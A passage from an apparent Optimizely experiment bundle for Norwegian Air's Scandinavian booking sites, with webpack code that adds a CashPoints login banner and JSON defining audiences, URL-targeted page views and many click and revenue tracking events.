                            if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                              enumerable: !0,
                              value: value
                            }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                              return value[key];
                            }.bind(null, key));
                            return ns;
                          }, __webpack_require__.n = function (module) {
                            var getter = module && module.__esModule ? function () {
                              return module.default;
                            } : function () {
                              return module;
                            };
                            return __webpack_require__.d(getter, "a", getter), getter;
                          }, __webpack_require__.o = function (object, property) {
                            return Object.prototype.hasOwnProperty.call(object, property);
                          }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 0);
                        }([function (module, exports, __webpack_require__) {
                          __webpack_require__(1), module.exports = __webpack_require__(2);
                        }, function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          __webpack_require__.r(__webpack_exports__);
                          var v1_v1 = __webpack_require__(2),
                            v1_default = __webpack_require__.n(v1_v1);
                          !function () {
                            function norT138_htmlInsertion() {
                              var host;
                              document.querySelector("head").insertAdjacentHTML("afterbegin", '<style branchName="NOR_T138_LoginForCashpoints">'.concat(v1_default.a, "</style>")), document.querySelector('[data-ng-if="vm.showOldLoginForm"] .page-cover__content').insertAdjacentHTML("afterend", ("no" !== (host = window.location.hostname.replace("www.norwegian.", "")) && (host = window.location.pathname.split("/")[1]), '<div class="NOR_T138_MainWrapper">\n        <div class="NOR_T138_InfoIcon"><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">\n          <path fill-rule="evenodd" clip-rule="evenodd" d="M16 28C22.6274 28 28 22.6274 28 16C28 9.37258 22.6274 4 16 4C9.37258 4 4 9.37258 4 16C4 22.6274 9.37258 28 16 28ZM14.9092 14.9091V22.5455H17.0911V14.9091H14.9092ZM16.0001 12.7273C15.0592 12.7273 14.3638 12.0113 14.3638 11.0909C14.3638 10.1704 15.0592 9.45453 16.0001 9.45453C16.941 9.45453 17.6365 10.1704 17.6365 11.0909C17.6365 12.0113 16.941 12.7273 16.0001 12.7273Z" fill="#003251"/>\n          </svg>\n          </div>\n          <div class="NOR_T138_InfoText">\n            '.concat({
                                se: {
                                  norT138Cashpoint: "Logg inn for muligheten til å opptjene og betale med CashPoints."
                                },
                                dk: {
                                  norT138Cashpoint: "Log ind for at få mulighed for at optjene og betale med CashPoints."
                                },
                                no: {
                                  norT138Cashpoint: "Logga in för möjligheten att tjäna och betala med CashPoints."
                                }
                              }[host].norT138Cashpoint, "\n          </div>")));
                            }
                            !function () {
                              var observer,
                                listeners = [],
                                doc = window.document,
                                MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
                              function check() {
                                for (var listener, elements, i = 0, len = listeners.length; i < len; i++) {
                                  listener = listeners[i];
                                  for (var element, j = 0, jLen = (elements = doc.querySelectorAll(listener.selector)).length; j < jLen; j++) (element = elements[j]).ready || (element.ready = []), element.ready[i] || (element.ready[i] = !0, listener.fn.call(element, element));
                                }
                              }
                              window.optiReady = function (selector, fn) {
                                listeners.push({
                                  selector: selector,
                                  fn: fn
                                }), observer || (observer = new MutationObserver(check)).observe(doc.documentElement, {
                                  childList: !0,
                                  subtree: !0
                                }), check();
                              };
                            }(), window.optiReady('[data-ng-if="vm.showOldLoginForm"] .page-cover__content', function () {
                              console.log("*** T138 / Log in / Log in for CashPoints / Mobile ***"), norT138_htmlInsertion();
                            });
                          }();
                        }, function (module, exports) {}]);
                      },
                      "dependencies": []
                    }, {
                      "id": "52D8F46D-BC4D-4080-B561-ABC07C7441CE",
                      "type": "append",
                      "selector": "head",
                      "value": "<style>.NOR_T138_MainWrapper{display:flex;padding:8px;border:1px solid #648FBB;background:#EBF4FF;color:#003251;margin-bottom:20px}.NOR_T138_MainWrapper .NOR_T138_InfoIcon{padding-right:12px}</style>",
                      "dependencies": []
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "25241510788",
                  "endOfRange": 10000
                }],
                "name": "[Code review] T138 / Log in / Log in for CashPoints / Mobile",
                "bucketingStrategy": null
              }],
              "policy": "single_experiment",
              "viewIds": ["25260630359"],
              "weightDistributions": null,
              "decisionMetadata": null
            }],
            "groups": [],
            "audiences": [{
              "id": "17279193910",
              "name": "Test Cookie",
              "conditions": ["and", ["or", ["or", {
                "match": "exact",
                "name": "testcookie",
                "type": "cookies",
                "value": "true"
              }], ["or", {
                "match": "exact",
                "name": "test",
                "type": "query",
                "value": "true"
              }]]]
            }, {
              "id": "17412550827",
              "name": "Mobile users",
              "conditions": ["and", ["or", ["or", {
                "match": null,
                "name": null,
                "type": "device",
                "value": "mobile"
              }, {
                "match": null,
                "name": null,
                "type": "device",
                "value": "iphone"
              }]]]
            }, {
              "id": "17468470179",
              "name": "Desktop only",
              "conditions": ["and", ["or", ["or", {
                "match": null,
                "name": null,
                "type": "device",
                "value": "desktop"
              }]]]
            }, {
              "id": "17626340169",
              "name": "Browsers: Chrome, Safari, Edge, FireFox",
              "conditions": ["and", ["or", ["or", {
                "match": null,
                "name": null,
                "type": "browser_version",
                "value": "gc"
              }], ["or", {
                "match": null,
                "name": null,
                "type": "browser_version",
                "value": "safari"
              }], ["or", {
                "match": null,
                "name": null,
                "type": "browser_version",
                "value": "edge"
              }], ["or", {
                "match": null,
                "name": null,
                "type": "browser_version",
                "value": "ff"
              }]]]
            }, {
              "id": "20658331282",
              "name": "Country / SE,DK,NO",
              "conditions": ["and", ["or", ["or", {
                "match": null,
                "name": null,
                "type": "code",
                "value": "window.location.pathname.indexOf('/se/') > -1"
              }], ["or", {
                "match": null,
                "name": null,
                "type": "code",
                "value": "window.location.pathname.indexOf('/dk/') > -1"
              }], ["or", {
                "match": null,
                "name": null,
                "type": "code",
                "value": "window.location.hostname.indexOf('norwegian.no') > -1"
              }]]]
            }, {
              "id": "25031190207",
              "name": "NOR T132 Abandonned Cart",
              "conditions": ["and", ["or", ["or", {
                "match": null,
                "name": null,
                "type": "code",
                "value": "localStorage.getItem('ngStorage-abandonedBasket') !== null"
              }]]]
            }],
            "listTargetingKeys": [],
            "visitorAttributes": [],
            "visitorIdLocator": null,
            "integrationSettings": [],
            "views": [{
              "id": "17429510535",
              "category": "other",
              "apiName": "17273916855_mobile__login_page",
              "name": "Visit Page: Login - Mobile",
              "staticConditions": ["or", ["or", {
                "match": "substring",
                "type": "url",
                "value": "/ipr/Booking#/login"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "dom_changed"
            }, {
              "id": "17433920372",
              "category": "other",
              "apiName": "17273916855_mobile__confirmation_page",
              "name": "Mobile / Confirmation Page (DOM)",
              "staticConditions": ["or", ["or", {
                "match": "substring",
                "type": "url",
                "value": "#/receipt"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "dom_changed"
            }, {
              "id": "17445131014",
              "category": "other",
              "apiName": "17273916855_mobile__meals_page",
              "name": "Mobile / Meals page",
              "staticConditions": ["or", ["or", {
                "match": "substring",
                "type": "url",
                "value": "/ipr/Booking#/meal"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "dom_changed"
            }, {
              "id": "17453740357",
              "category": "other",
              "apiName": "17273916855_desktop__confirmation_page",
              "name": "Desktop / Confirmation Page",
              "staticConditions": ["or", ["or", {
                "match": "substring",
                "type": "url",
                "value": "/ipc/resmake/receipt"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": []
            }, {
              "id": "17622750251",
              "category": "other",
              "apiName": "17273916855_all_devices__confirmation_page",
              "name": "All devices / Confirmation page (DOM)",
              "staticConditions": ["or", ["or", {
                "match": "substring",
                "type": "url",
                "value": "/resmake/receipt"
              }, {
                "match": "substring",
                "type": "url",
                "value": "#/receipt"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "dom_changed"
            }, {
              "id": "24247450013",
              "category": "other",
              "apiName": "17273916855_url_targeting_for_dev_t124__avaday__add_klarna_bel_1",
              "name": "URL Targeting for [LIVE] T124 / Avaday / Add Klarna below CTA / Desktop / SE NO DK",
              "staticConditions": ["and", ["or", {
                "match": "substring",
                "type": "url",
                "value": "/ipc/availability/avaday"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "callback",
              "activationCode": /* eslint-disable no-var */
              /* eslint-disable no-unused-vars */
              function callbackFn(activate, options) {
                function waitUntil(predicate, time = 10000) {
                  return new Promise(resolve => {
                    let int = setInterval(() => {
                      if (predicate()) {
                        resolve(predicate());
                        clearInterval(int);
                        int = null;
                      }
                    }, 500);
                    setTimeout(() => {
                      if (int !== null) {
                        clearInterval(int);
                      }
                    }, time);
                  });
                }
                waitUntil(() => document.querySelector('div#ctl00_MainContent_ipcAvaDay_ipcAvaSsrInput_pnlAvaCodesBox') !== null).then(() => {
                  function callback() {
                    const headerPosition = document.querySelector('div#ctl00_MainContent_ipcAvaDay_ipcAvaSsrInput_pnlAvaCodesBox').getBoundingClientRect();
                    const headerOnScreen = headerPosition.top < window.innerHeight && headerPosition.bottom >= 0;
                    if (headerOnScreen) {
                      window.removeEventListener('scroll', callback);
                      activate();
                    }
                  }
                  window.addEventListener('scroll', callback);
                });
              }
            }, {
              "id": "24311260614",
              "category": "other",
              "apiName": "17273916855_meal_page_booking_flow__desktop",
              "name": "Meal page booking flow - desktop",
              "staticConditions": ["and", ["or", {
                "match": "simple",
                "type": "url",
                "value": "https://www.norwegian.no/ipc/resmake/meal"
              }, {
                "match": "simple",
                "type": "url",
                "value": "https://www.norwegian.com/se/ipc/resmake/meal"
              }, {
                "match": "simple",
                "type": "url",
                "value": "https://www.norwegian.com/dk/ipc/resmake/meal"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": []
            }, {
              "id": "24341690438",
              "category": "other",
              "apiName": "17273916855_url_targeting_for_t126__meals__meals_imagemenu__mobi",
              "name": "URL Targeting for [QA]T126 / Meals / Meals image&menu / Mobile",
              "staticConditions": ["and", ["or", {
                "match": "substring",
                "type": "url",
                "value": "/ipr/Booking#/meal"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "url_changed"
            }, {
              "id": "24708031292",
              "category": "other",
              "apiName": "17273916855_url_targeting_for_copy_of_dev_t133__campaign_page__d",
              "name": "URL Targeting for [DEV] T133 / Campaign page / Discount code / SE, NO, DK / Mobile",
              "staticConditions": ["or", ["or", {
                "match": "substring",
                "type": "url",
                "value": "/destinasjoner/"
              }, {
                "match": "substring",
                "type": "url",
                "value": "/destinationer/"
              }, {
                "match": "substring",
                "type": "url",
                "value": "/summer-sale/"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "url_changed"
            }, {
              "id": "24793031969",
              "category": "other",
              "apiName": "17273916855_url_targeting_for_copy_of_dev_t132__homepage__abando",
              "name": "URL Targeting for [LIVE] T132 / Homepage / Abandonned basket in search box / SE, NO, DK || Mobile",
              "staticConditions": ["and", ["or", {
                "match": "simple",
                "type": "url",
                "value": "https://www.norwegian.no/"
              }, {
                "match": "simple",
                "type": "url",
                "value": "https://www.norwegian.com/dk"
              }, {
                "match": "simple",
                "type": "url",
                "value": "https://www.norwegian.com/se"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "url_changed"
            }, {
              "id": "25138640578",
              "category": "other",
              "apiName": "17273916855_url_targeting_for_t135__meals__images_in_dropdown__d",
              "name": "URL Targeting for [QA] T135 / Meals / Images in dropdown / Desktop",
              "staticConditions": ["and", ["or", {
                "match": "substring",
                "type": "url",
                "value": "/ipc/resmake/meal"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "url_changed"
            }, {
              "id": "25176140013",
              "category": "other",
              "apiName": "17273916855_url_targeting_for_copy_of_t125__payment__badges_on_p",
              "name": "URL Targeting for [LIVE] T125.1 / Payment / Badges on payment option / Mobile / SE, NO, DK",
              "staticConditions": ["or", ["or", {
                "match": "substring",
                "type": "url",
                "value": "https://payment.norwegian.no/"
              }, {
                "match": "substring",
                "type": "url",
                "value": "https://payment.norwegian.com/se/"
              }, {
                "match": "substring",
                "type": "url",
                "value": "https://payment.norwegian.com/dk/"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "url_changed"
            }, {
              "id": "25239971235",
              "category": "other",
              "apiName": "17273916855_url_targeting_for_t136__destinations__filters_on_sid",
              "name": "URL Targeting for [Code Review] T136 / Destinations / Filters on side / Desktop / SE NO DK",
              "staticConditions": ["or", ["or", {
                "match": "substring",
                "type": "url",
                "value": "/se/destinationer/"
              }, {
                "match": "substring",
                "type": "url",
                "value": ".no/destinasjoner/"
              }, {
                "match": "substring",
                "type": "url",
                "value": "/dk/destinationer/"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "url_changed"
            }, {
              "id": "25260630359",
              "category": "other",
              "apiName": "17273916855_url_targeting_for_dev_t138__log_in__log_in_for_cashp",
              "name": "URL Targeting for [Code review] T138 / Log in / Log in for CashPoints / Mobile",
              "staticConditions": ["or", ["or", {
                "match": "substring",
                "type": "url",
                "value": "/ipr/Booking#/login"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "url_changed"
            }, {
              "id": "25351520104",
              "category": "other",
              "apiName": "17273916855_url_targeting_for_t139__destinations__four_vs_three_",
              "name": "URL Targeting for [QA] T139 / Destinations / Four VS Three / Desktop & Mobile",
              "staticConditions": ["or", ["or", {
                "match": "substring",
                "type": "url",
                "value": "/destinations"
              }, {
                "match": "substring",
                "type": "url",
                "value": ".no/destinasjoner"
              }, {
                "match": "substring",
                "type": "url",
                "value": "/destinationer"
              }]],
              "deactivationEnabled": false,
              "undoOnDeactivation": false,
              "tags": [],
              "activationType": "url_changed"
            }],
            "events": [{
              "id": "17468832211",
              "viewId": null,
              "name": "Continue Click",
              "category": "other",
              "apiName": "continueClick",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "17483770158",
              "viewId": "17433920372",
              "name": "Clicks on CarTrawler / Mobile",
              "category": "other",
              "apiName": "17273916855_clicks_on_cartrawler__mobile",
              "eventType": "click",
              "eventFilter": {
                "filterType": "target_selector",
                "selector": "#ctl00_MainContent_ipcResMakeReceipt_pnlSectionContainer"
              }
            }, {
              "id": "17489810123",
              "viewId": "17453740357",
              "name": "Clicks on CarTrawler Widget",
              "category": "other",
              "apiName": "17273916855_clicks_on_cartrawler_widget",
              "eventType": "click",
              "eventFilter": {
                "filterType": "target_selector",
                "selector": "#ctl00_MainContent_ipcResMakeReceipt_pnlSectionContainer"
              }
            }, {
              "id": "17544761532",
              "viewId": null,
              "name": "handluggage-revenue",
              "category": "other",
              "apiName": "handluggage-revenue",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "17550490814",
              "viewId": null,
              "name": "Product sold: Seating",
              "category": "other",
              "apiName": "seating-revenue",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "17556111552",
              "viewId": null,
              "name": "prioboarding-revenue",
              "category": "other",
              "apiName": "prioboarding-revenue",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "17557560862",
              "viewId": null,
              "name": "Ticket type sold: Any ticket",
              "category": "other",
              "apiName": "flight-revenue",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "17560021866",
              "viewId": null,
              "name": "Product sold: Luggage",
              "category": "other",
              "apiName": "luggage-revenue",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "17566951571",
              "viewId": null,
              "name": "sports-revenue",
              "category": "other",
              "apiName": "sports-revenue",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "17571182779",
              "viewId": null,
              "name": "logins",
              "category": "other",
              "apiName": "logins",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "17574931534",
              "viewId": null,
              "name": "meal-revenue",
              "category": "other",
              "apiName": "meal-revenue",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "17575321926",
              "viewId": null,
              "name": "cancellationprotection-revenue",
              "category": "other",
              "apiName": "cancellationprotection-revenue",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "17575321928",
              "viewId": null,
              "name": "Product sold: Fast Track",
              "category": "other",
              "apiName": "fasttrack-revenue",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "20896384674",
              "viewId": "17429510535",
              "name": "Mobile / Login button click",
              "category": "other",
              "apiName": "17273916855_mobile__login_button_click",
              "eventType": "click",
              "eventFilter": {
                "filterType": "target_selector",
                "selector": "fieldset > .button--primary"
              }
            }, {
              "id": "20932360818",
              "viewId": "17429510535",
              "name": "Mobile / Guest link",
              "category": "other",
              "apiName": "17273916855_mobile__guest_link",
              "eventType": "click",
              "eventFilter": {
                "filterType": "target_selector",
                "selector": ".link--bold"
              }
            }, {
              "id": "20933723609",
              "viewId": "17429510535",
              "name": "Mobile / New user button",
              "category": "other",
              "apiName": "17273916855_mobile__existing_user_button",
              "eventType": "click",
              "eventFilter": {
                "filterType": "target_selector",
                "selector": ".box > .button--primary"
              }
            }, {
              "id": "21040460399",
              "viewId": null,
              "name": "Add a Bag",
              "category": "other",
              "apiName": "norAdd_a_bag",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21186750280",
              "viewId": null,
              "name": "Total LowFare Plus Tickets",
              "category": "other",
              "apiName": "totalLowFarePlus",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21194660116",
              "viewId": null,
              "name": "Total LowFare Flex Tickets",
              "category": "other",
              "apiName": "lowFareFlex",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21196972154",
              "viewId": null,
              "name": "Clicks on LowFare+",
              "category": "other",
              "apiName": "lowFarePlusClick",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21199621696",
              "viewId": null,
              "name": "Total LowFare Tickets",
              "category": "other",
              "apiName": "totalLowFare",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21217713904",
              "viewId": null,
              "name": "Multiple BNDL PRIO",
              "category": "other",
              "apiName": "Multiple_BNDL_PRIO",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21240442686",
              "viewId": null,
              "name": "Unique Bundle_Prio",
              "category": "other",
              "apiName": "Unique_BNDL_PRIO",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21342950649",
              "viewId": null,
              "name": "Custom Cashpoints",
              "category": "other",
              "apiName": "custom_cashpoints",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21557741829",
              "viewId": null,
              "name": "T75 Mobile Special Luggage Dropdown Clicks",
              "category": "other",
              "apiName": "specialLuggageDropDownClickT75",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21585880007",
              "viewId": null,
              "name": "Mobile/Clicks on departures",
              "category": "other",
              "apiName": "Clicks_on_departures",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21605510016",
              "viewId": null,
              "name": "Clicks on back button on ancillaries",
              "category": "other",
              "apiName": "ancillaries_back_button_81",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21652690819",
              "viewId": null,
              "name": "Clicks on Continue to Bestilling",
              "category": "other",
              "apiName": "continueClickToLoginPage",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21658410513",
              "viewId": null,
              "name": "Clicks on \u201cwifi\u201d link",
              "category": "other",
              "apiName": "wifi_ctaClick",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21698801217",
              "viewId": null,
              "name": "Clicks inside Endre Sok Accordions content",
              "category": "other",
              "apiName": "Endre_Sok_Accordions_content_NOR_85",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21722531085",
              "viewId": null,
              "name": "Clicks on Endre S\u00f8k box",
              "category": "other",
              "apiName": "Endre_Sok_box_85",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21724261312",
              "viewId": null,
              "name": "Clicks on Lowfare button",
              "category": "other",
              "apiName": "lowfare_button_NOR_85",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21732581028",
              "viewId": null,
              "name": "Mobile / Desktop : Clicks on progress bar",
              "category": "other",
              "apiName": "Clicks_on_progress_bar",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21761360109",
              "viewId": null,
              "name": "Next funnel page (login)",
              "category": "other",
              "apiName": "Next_funnel_page_NOR_85",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21854532472",
              "viewId": null,
              "name": "Clicks on CTA to continue to next step",
              "category": "other",
              "apiName": "continue_cta_next_step",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21855005102",
              "viewId": null,
              "name": "Clicks on Details",
              "category": "other",
              "apiName": "Clicks_on_Details",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21900470031",
              "viewId": null,
              "name": "Clicks on new CTA",
              "category": "other",
              "apiName": "Clicks_on_new_CTA",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21903060180",
              "viewId": null,
              "name": "Interactions with selection boxes",
              "category": "other",
              "apiName": "click_selection_boxes",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "21921260021",
              "viewId": null,
              "name": "Clicks on old CTA",
              "category": "other",
              "apiName": "Clicks_on_old_CTA",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22013172692",
              "viewId": null,
              "name": "Icon_click_Liten_veske_under_setet",
              "category": "other",
              "apiName": "Icon_click_Liten_veske_under_setet",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22025511309",
              "viewId": null,
              "name": "Click H\u00e5ndbagasje i bagasjehylle",
              "category": "other",
              "apiName": "Click_Handbagasje_bagasjehylle",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22048223542",
              "viewId": null,
              "name": "Desktop Clicks on CTA Oppgrader to Flex ",
              "category": "other",
              "apiName": "Desktop_Clicks_on_CTA_Oppgrader_to_Flex",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22075740882",
              "viewId": null,
              "name": "Desktop Clicks on CTA Oppgrader to Lowfareplus",
              "category": "other",
              "apiName": "Desktop_Clicks_on_CTA_Oppgrader_to_Lowfareplus",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22108621108",
              "viewId": null,
              "name": "Interaction with search/change destination",
              "category": "other",
              "apiName": "Interaction_with_search_destination",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22127131233",
              "viewId": null,
              "name": "Clicks on destinations",
              "category": "other",
              "apiName": "Clicks_on_destinations_90",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22134590500",
              "viewId": null,
              "name": "Clicks on continue CTA ",
              "category": "other",
              "apiName": "Clicks_on_continue_CTA",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22262650643",
              "viewId": null,
              "name": "luggage_sold_t92",
              "category": "other",
              "apiName": "luggage_sold_t92",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22264300593",
              "viewId": null,
              "name": "Next_page_from_Pax_to_Seating_t92_desk",
              "category": "other",
              "apiName": "Next_page_from_Pax_to_Seating_t92_desk",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22308390019",
              "viewId": null,
              "name": "Next_page_from_Ancillaries_to_Payment_t92_desk",
              "category": "other",
              "apiName": "Next_page_from_Ancillaries_to_Payment_t92_desk",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22319020431",
              "viewId": null,
              "name": "special_baggage_sold_t92_desk",
              "category": "other",
              "apiName": "special_baggage_sold_t92_desk",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22365570202",
              "viewId": null,
              "name": "Clicks_on_Continue_to_Bestilling_t93",
              "category": "other",
              "apiName": "Clicks_on_Continue_to_Bestilling_t93",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22370630009",
              "viewId": null,
              "name": "Clicks_on_Sammenlign_billettyper",
              "category": "other",
              "apiName": "Clicks_on_Sammenlign_billettyper",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22379340059",
              "viewId": null,
              "name": "Clicks_on_baggage_icons",
              "category": "other",
              "apiName": "Clicks_on_baggage_icons",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22383341507",
              "viewId": null,
              "name": "Clicks_on_Continue_to_Bestilling_t96_mob",
              "category": "other",
              "apiName": "Clicks_on_Continue_to_Bestilling_t96_mob",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22397460074",
              "viewId": null,
              "name": "Baggage_revenue_T93",
              "category": "other",
              "apiName": "Baggage_revenue_T93",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22403280060",
              "viewId": null,
              "name": "Clicks_on_Continue_to_Bestilling_t96_desk",
              "category": "other",
              "apiName": "Clicks_on_Continue_to_Bestilling_t96_desk",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22406751016",
              "viewId": null,
              "name": "Clicks_on_Continue_at_Ancillaries_t92_desk",
              "category": "other",
              "apiName": "Clicks_on_Continue_at_Ancillaries_t92_desk",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22449840065",
              "viewId": null,
              "name": "Clicks_on_Continue_at_PAX_t92_desk",
              "category": "other",
              "apiName": "Clicks_on_Continue_at_PAX_t92_desk",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22564780208",
              "viewId": null,
              "name": "Product_Priority_Boarding",
              "category": "other",
              "apiName": "Product_Priority_Boarding",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22580310190",
              "viewId": null,
              "name": "Product_Klimakompensering",
              "category": "other",
              "apiName": "Product_Klimakompensering",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22580720112",
              "viewId": null,
              "name": "Product_Avbestillingsbeskyttelse",
              "category": "other",
              "apiName": "Product_Avbestillingsbeskyttelse",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22580750091",
              "viewId": null,
              "name": "Clicks_on_Continue_at_Ancillaries",
              "category": "other",
              "apiName": "Clicks_on_Continue_at_Ancillaries",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22584630010",
              "viewId": null,
              "name": "Product_Allianz",
              "category": "other",
              "apiName": "Product_Allianz",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22591810123",
              "viewId": null,
              "name": "Product_Unicef",
              "category": "other",
              "apiName": "Product_Unicef",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22597270105",
              "viewId": null,
              "name": "Product_Fast_track",
              "category": "other",
              "apiName": "Product_Fast_track",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22662981680",
              "viewId": null,
              "name": "Clicks on Continue without",
              "category": "other",
              "apiName": "Clicks_on_Continue_without",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22664800094",
              "viewId": null,
              "name": "Product Add to cart: Seating",
              "category": "other",
              "apiName": "Product_Add_to_cart_Seating",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22683770209",
              "viewId": null,
              "name": "Visit page: Payment Page",
              "category": "other",
              "apiName": "Visit_page_Payment_Page",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22702101708",
              "viewId": null,
              "name": "Product Added to cart: Avbestillinsbeskyttelse",
              "category": "other",
              "apiName": "Product_Added_to_cart_Avbestillinsbeskyttelse",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22702571189",
              "viewId": null,
              "name": "Product Added to cart: Priority",
              "category": "other",
              "apiName": "Product_Added_to_cart_Priority",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22704371323",
              "viewId": null,
              "name": "Product Added to cart: Chooose",
              "category": "other",
              "apiName": "Product_Added_to_cart_Chooose",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22705942301",
              "viewId": null,
              "name": "Product Fast track: Click to expand",
              "category": "other",
              "apiName": "Product_Fast_track_Click_to_expand",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22713550911",
              "viewId": null,
              "name": "Product Added to cart: Special Bagage",
              "category": "other",
              "apiName": "Product_Added_to_cart_Special_Bagage",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22720910063",
              "viewId": null,
              "name": "Product Priority: Click to expand",
              "category": "other",
              "apiName": "Product_Priority_Click_to_expand",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22726961799",
              "viewId": null,
              "name": "Product Added to cart: Allianz",
              "category": "other",
              "apiName": "Product_Added_to_cart_Allianz",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22732971670",
              "viewId": null,
              "name": "Product Avbestillinsbeskyttelse: Click to expand ",
              "category": "other",
              "apiName": "Product_Avbestillinsbeskyttelse_Click_to_expand",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22735261665",
              "viewId": null,
              "name": "Product Allianz: Click to expand ",
              "category": "other",
              "apiName": "Product_Allianz_Click_to_expand",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22735660733",
              "viewId": null,
              "name": "Product Added to cart: UNICEF",
              "category": "other",
              "apiName": "Product_Added_to_cart_UNICEF",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22757110198",
              "viewId": null,
              "name": "Product Added to cart: Fast track",
              "category": "other",
              "apiName": "Product_Added_to_cart_Fast_track",
              "eventType": "custom",
              "eventFilter": null
            }, {
              "id": "22886110112",
              "viewId": null,
              "name": "Clicks on Popup: Continue without",
              "category": "other",
              "apiName": "Clicks_on_Popup_Continue_without",
              "eventType": "custom",
              "eventFilter": null
            }, {
